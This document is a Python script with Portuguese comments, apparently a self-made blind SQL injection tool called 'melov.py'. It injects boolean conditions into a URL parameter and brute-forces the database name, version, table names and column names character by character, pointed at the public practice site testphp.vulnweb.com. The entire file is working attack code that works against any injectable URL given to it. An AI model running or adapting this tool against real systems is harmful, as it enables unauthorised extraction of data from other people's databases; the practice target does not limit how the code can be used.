import aiohttp
import asyncio
import requests
from urllib.parse import urlparse, parse_qs

# Estruturas para armazenar os resultados
database_info = {}  # Dicionário para armazenar nome e versão do banco de dados
tables = []
columns = {}  # Dicionário para armazenar colunas por tabela

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

def display_banner():
    banner = """
    ███╗   ███╗███████╗██╗      ██████╗ ██╗   ██╗
    ████╗ ████║██╔════╝██║     ██╔═══██╗██║   ██║
    ██╔████╔██║█████╗  ██║     ██║   ██║██║   ██║
    ██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║   ██║
    ██║ ╚═╝ ██║███████╗███████╗╚██████╔╝╚██████╔╝
    ╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝ 
    ferramenta melov.py - teste automatizado de extração de dados MySQL
    """
    print("\033[1;36m" + banner + "\033[0m") 

def check_url_stability(url: str):
    """Verifica se o conteúdo da URL é estável."""
    responses = set()
    for _ in range(5):
        response = requests.get(url, headers=headers).text
        responses.add(response)
    if len(responses) == 1:
        print("[+] O conteúdo da URL é estável.")
        return True
    else:
        print("[-] O conteúdo da URL não é estável.")
        return False

def detect_parameters(url: str):
    """Detecta os parâmetros na URL fornecida."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if query_params:
        print(f"[+] Parâmetros detectados na URL: {list(query_params.keys())}")
        return list(query_params.keys())
    else:
        print("[-] Nenhum parâmetro detectado na URL.")
        return []

async def fetch(session, url):
    """Realiza uma requisição GET assíncrona."""
    async with session.get(url) as response:
        return await response.text()

async def get_true_condition_response(session, url: str):
    """Obtém a resposta quando a condição SQL é verdadeira."""
    true_condition = f"{url} and 1=1 -- -"
    return await fetch(session, true_condition)

async def get_false_condition_response(session, url: str):
    """Obtém a resposta quando a condição SQL é falsa."""
    false_condition = f"{url} and 1=0 -- -"
    return await fetch(session, false_condition)

async def extract_data(session, url: str, query: str, true_response: str, false_response: str):
    """Extrai dados com base em uma consulta SQL injetada."""
    result = []
    i = 1
    while True:
        char_found = False  
        for j in range(32, 127): 
            montagem = f"{url} and ascii(substring(({query}), {i}, 1)) = {j} -- -"
            try:
                html = await fetch(session, montagem)
                if len(html) == len(true_response):
                    result.append(chr(j))
                    print(f"Caractere encontrado: {''.join(result)}", flush=True, end='\r')
                    char_found = True
                    break  
            except Exception as e:
                print(f"Erro na requisição: {e}")
                return ''.join(result)
        if not char_found:
            break  
        i += 1  
    print()  
    return ''.join(result)

async def extract_database_name(session, url: str, true_response: str, false_response: str):
    """Extrai o nome do banco de dados."""
    query = "database()"
    return await extract_data(session, url, query, true_response, false_response)

async def extract_database_version(session, url: str, true_response: str, false_response: str):
    """Extrai a versão do banco de dados."""
    query = "version()"
    return await extract_data(session, url, query, true_response, false_response)

async def extract_tables(session, url: str, true_response: str, false_response: str):
    """Extrai as tabelas do banco de dados."""
    query = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
    tables_str = await extract_data(session, url, query, true_response, false_response)
    return [table for table in tables_str.split(',') if table]

async def extract_columns(session, url: str, table_name: str, true_response: str, false_response: str):
    """Extrai as colunas de uma tabela específica."""
    query = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"
    columns_str = await extract_data(session, url, query, true_response, false_response)
    return [column for column in columns_str.split(',') if column]

def display_results(database_info, tables, columns):
    """Exibe os resultados de forma organizada e estilosa."""
    print("\n\033[1;32m[+] Resultados da extração:\033[0m")
    print(f"\033[1;34mdb -\033[0m")
    print(f" |__ \033[1;33mversion: {database_info.get('Versão do banco de dados', 'N/A')}\033[0m")
    print(f" |__ \033[1;33mname: {database_info.get('Nome do banco de dados', 'N/A')}\033[0m")
    
    if tables:
        print(f" |__ \033[1;33mtables:\033[0m")
        for table in tables:
            print(f"     |__ \033[1;35m{table}\033[0m")
            if table in columns:
                print(f"         |__ \033[1;36mcolumns:\033[0m")
                for column in columns[table]:
                    print(f"             |__ \033[1;37m{column}\033[0m")

async def main():
    url = 'http://testphp.vulnweb.com/product.php?pic=1'
    
    display_banner()
    
    if not check_url_stability(url):
        print("[-] A URL não é estável. A execução será interrompida.")
        return
    
    parameters = detect_parameters(url)
    if not parameters:
        print("[-] Nenhum parâmetro detectado. A execução será interrompida.")
        return
    
    async with aiohttp.ClientSession() as session:
        true_response = await get_true_condition_response(session, url)
        false_response = await get_false_condition_response(session, url)

        print(f"Resposta verdadeira (1=1): {true_response[:100]}...")
        print(f"Resposta falsa (1=0): {false_response[:100]}...")

        database_name = await extract_database_name(session, url, true_response, false_response)
        database_info["Nome do banco de dados"] = database_name

        database_version = await extract_database_version(session, url, true_response, false_response)
        database_info["Versão do banco de dados"] = database_version

        
        continuar = input("\nDeseja continuar e extrair as tabelas? (s/n): ").strip().lower()
        if continuar == 's':
            global tables
            tables = await extract_tables(session, url, true_response, false_response)
            print(f"\nTabelas encontradas: {tables}")

            table_choice = input("\nDigite o nome da tabela para extrair suas colunas: ").strip()
            if table_choice in tables:
                global columns
                columns[table_choice] = await extract_columns(session, url, table_choice, true_response, false_response)
                print(f"\nColunas da tabela '{table_choice}':")
                for column in columns[table_choice]:
                    print(f"  - {column}")
            else:
                print(f"Tabela '{table_choice}' não encontrada.")
        else:
            print("Operação encerrada.")

        # Exibe os resultados de forma organizada
        display_results(database_info, tables, columns)

if __name__ == "__main__":
    asyncio.run(main())
